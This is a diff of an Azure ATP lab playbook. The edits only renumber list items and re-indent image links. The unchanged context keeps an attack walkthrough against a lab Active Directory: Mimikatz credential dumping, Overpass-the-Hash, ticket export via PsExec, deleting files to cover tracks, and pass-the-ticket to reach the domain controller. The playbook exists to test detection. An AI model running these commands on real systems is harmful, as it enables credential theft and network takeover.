@@ -49,16 +49,16 @@ During our mock reconnaissance attacks, **VictimPC** wasn't only exposed to Jeff
 ### Mimikatz sekurlsa::logonpasswords
 
 1. Open an **elevated command prompt** on **VictimPC**. 
-2. Navigate to the tools folder where you saved Mimikatz and execute the following command:
+1. Navigate to the tools folder where you saved Mimikatz and execute the following command:
 
    ``` cmd
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
    ```
 
-3. Open **c:\\temp\\victimpc.txt** to view the harvested credentials Mimikatz found and wrote to the txt file.
-   ![Mimikatz output including RonHD's NTLM hash](media/playbook-lateral-sekurlsa-logonpasswords-output.png)
+1. Open **c:\\temp\\victimpc.txt** to view the harvested credentials Mimikatz found and wrote to the txt file.
+    ![Mimikatz output including RonHD's NTLM hash](media/playbook-lateral-sekurlsa-logonpasswords-output.png)
 
-4. We successfully harvested RonHD's NTLM hash from memory using mimikatz. We'll need the NTLM hash shortly.
+1. We successfully harvested RonHD's NTLM hash from memory using mimikatz. We'll need the NTLM hash shortly.
 
    > [!Important]
    > - It's expected and normal that the hashes shown in this example are different from the hashes you see in your own lab environment. The purpose of this exercise is to help you understand how the hashes were obtained, get their values, and use them in the next phases. </br> </br>
@@ -91,9 +91,9 @@ Using a common technique called **Overpass-the-Hash**, the harvested NTLM hash i
    > [!Note]
    > If your hash for RonHD was different in the previous steps, replace the NTLM hash above with the hash you gathered from *victimpc.txt*.
 
-   ![Overpass-the-hash via mimikatz](media/playbook-lateral-opth1.png)
+    ![Overpass-the-hash via mimikatz](media/playbook-lateral-opth1.png)
 
-2. Check that a new command prompt opens. It will be executing as RonHD, but that may not seem obvious *yet*. Don't close the new command prompt since you'll use it next.
+1. Check that a new command prompt opens. It will be executing as RonHD, but that may not seem obvious *yet*. Don't close the new command prompt since you'll use it next.
 
 Azure ATP won’t detect a hash passed on a local resource. Azure ATP detects when a hash is **used from one resource to access another** resource or service.
 
@@ -111,29 +111,29 @@ We'll use **PowerSploit** ```Get-NetLocalGroup``` to help answer that.
    Get-NetLocalGroup 10.0.24.6
    ```
 
-   ![Get local admins for 10.0.24.6 via PowerSploit](media/playbook-lateral-adminpcsamr.png)
+    ![Get local admins for 10.0.24.6 via PowerSploit](media/playbook-lateral-adminpcsamr.png)
 
    Behind the scenes, this uses Remote SAM to identify the local admins for the IP we discovered earlier that was exposed to a Domain Admin account.
 
    Our output will look similar to:
 
-   ![Output of the PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)
+    ![Output of the PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)
 
    This machine has two Local Administrators, the built-in Administrator "ContosoAdmin" and "Helpdesk". We know RonHD is a member of the "Helpdesk" Security Group. We also were told the machine's name, AdminPC. Since we have RonHD's credentials, we should be able to use it to laterally move to AdminPC and gain access to that machine.
 
-2. From the *same command prompt, which is running in context of RonHD*, type **exit** to get out of PowerShell if needed. Then, run the following command:
+1. From the *same command prompt, which is running in context of RonHD*, type **exit** to get out of PowerShell if needed. Then, run the following command:
 
    ``` cmd
    dir \\adminpc\c$
    ```
 
-3. We successfully accessed AdminPC. Let's see what tickets we have. In the same cmd prompt, run the following command:
+1. We successfully accessed AdminPC. Let's see what tickets we have. In the same cmd prompt, run the following command:
 
    ``` cmd
    klist
    ```
 
-   ![Use klist to show us Kerberos tickets in our current cmd.exe process](media/playbook-lateral-klist.png)
+    ![Use klist to show us Kerberos tickets in our current cmd.exe process](media/playbook-lateral-klist.png)
 
 You can see that, for this particular process, we have RonHD's TGT in memory. We successfully performed an Overpass-the-Hash attack in our lab. We converted the NTLM hash that was compromised earlier and used it to obtain a Kerberos TGT. That Kerberos TGT was then used to gain access to another network resource, in this case, AdminPC. 
 
@@ -183,15 +183,15 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
 
    That command will execute and export the tickets found in the LSASS.exe process and place them in the current directory, on AdminPC.
 
-2. We need to copy the tickets back over to VictimPC from AdminPC. Since we're only interested in SamiraA's tickets for this example, execute the following command:
+1. We need to copy the tickets back over to VictimPC from AdminPC. Since we're only interested in SamiraA's tickets for this example, execute the following command:
 
    ``` cmd
    xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
    ```
 
-   ![Export harvested credentials from AdminPC back to VictimPC](media/playbook-escalation-export_tickets2.png)
+    ![Export harvested credentials from AdminPC back to VictimPC](media/playbook-escalation-export_tickets2.png)
 
-3. Let's clean up our tracks on AdminPC by deleting our files.
+1. Let's clean up our tracks on AdminPC by deleting our files.
 
    ``` cmd
    rmdir \\adminpc\c$\temp /s /q
@@ -202,7 +202,7 @@ With Mimikatz staged on AdminPC, we'll use PsExec to remotely execute it.
 
    On our **VictimPC**, we have these harvested tickets in our **c:\temp\adminpc_tickets** folder:
 
-   ![C:\temp\tickets is our exported mimikatz output from AdminPC](media/playbook-escalation-export_tickets4.png)
+    ![C:\temp\tickets is our exported mimikatz output from AdminPC](media/playbook-escalation-export_tickets4.png)
 
 
 ### Mimikatz Kerberos::ptt
@@ -215,28 +215,28 @@ With the tickets locally on VictimPC, it's finally time to become SamiraA by "Pa
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
    ```
 
-   ![Import the stolen tickets into the cmd.exe process](media/playbook-escalation-ptt1.png)
+    ![Import the stolen tickets into the cmd.exe process](media/playbook-escalation-ptt1.png)
 
-2. In the same elevated command prompt, validate that the right tickets are in the command prompt session. Execute the following command:
+1. In the same elevated command prompt, validate that the right tickets are in the command prompt session. Execute the following command:
 
    ``` cmd
    klist
    ```
 
-   ![Run klist to see the imported tickets in the CMD process](media/playbook-escalation-ptt2.png)
+    ![Run klist to see the imported tickets in the CMD process](media/playbook-escalation-ptt2.png)
 
-3. Note that these tickets remain unused. Acting as an attacker, we successfully "passed the ticket". We harvested SamirA's credential from AdminPC, and then passed it to another process running on VictimPC.
+1. Note that these tickets remain unused. Acting as an attacker, we successfully "passed the ticket". We harvested SamirA's credential from AdminPC, and then passed it to another process running on VictimPC.
 
    > [!Note]
    > Like in Pass-the-Hash, Azure ATP doesn't know the ticket was passed  based on local client activity. However, Azure ATP does detect the activity *once the ticket is used*, that is, leveraged to access another resource/service.
 
-4. Complete your simulated attack by accessing the domain controller from **VictimPC**. In the command prompt, now running with the tickets of SamirA in memory, execute:
+1. Complete your simulated attack by accessing the domain controller from **VictimPC**. In the command prompt, now running with the tickets of SamirA in memory, execute:
 
    ``` cmd
    dir \\ContosoDC\c$
    ```
 
-   ![Access the c:\ drive of ContosoDC using SamirA's credentials](media/playbook-escalation-ptt3.png)
+    ![Access the c:\ drive of ContosoDC using SamirA's credentials](media/playbook-escalation-ptt3.png)
 
 Success! Through our mock attacks, we gained administrator access on our domain controller and succeeded in compromising our lab's Active Directory Domain/Forest.
 
